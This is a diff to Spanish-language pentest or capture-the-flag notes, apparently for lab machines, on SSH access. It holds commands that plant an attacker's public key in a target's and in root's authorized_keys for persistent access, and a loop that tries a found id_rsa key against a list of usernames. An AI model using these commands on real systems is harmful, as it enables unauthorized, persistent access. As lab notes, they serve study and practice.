@@ -431,7 +431,7 @@ Finalmente en la maquina target
 
 ```
 cd .ssh
- echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> authorized_keys
+ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QQ7IaxiVdTpsg5U19G3d nobody@nothing" >> authorized_keys
 
 ssh -i id_rsa strapi@10.10.14.57 
 ```
@@ -443,6 +443,20 @@ Probar usuarios de ssh ya cuando tienes una id_rsa
 for i in $(cat u.txt); do ssh -oBatchMode=yes -i id_rsa $i@10.129.242.42; done
 
 ```
+
+## Si no esta la carpeta .ssh de root creala
+
+Si no se encuntra tu puedes crearla
+
+```
+chmod 700 /root/.ssh
+touch /root/.ssh/authorized_keys
+chmod 600 /root/.ssh/authorized_keys
+pwd      
+
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTEQ/7hn6SuJDX5+bl6tk/ kai@kai" > authorized_keys 
+```
+
 
 ### SSH config
 
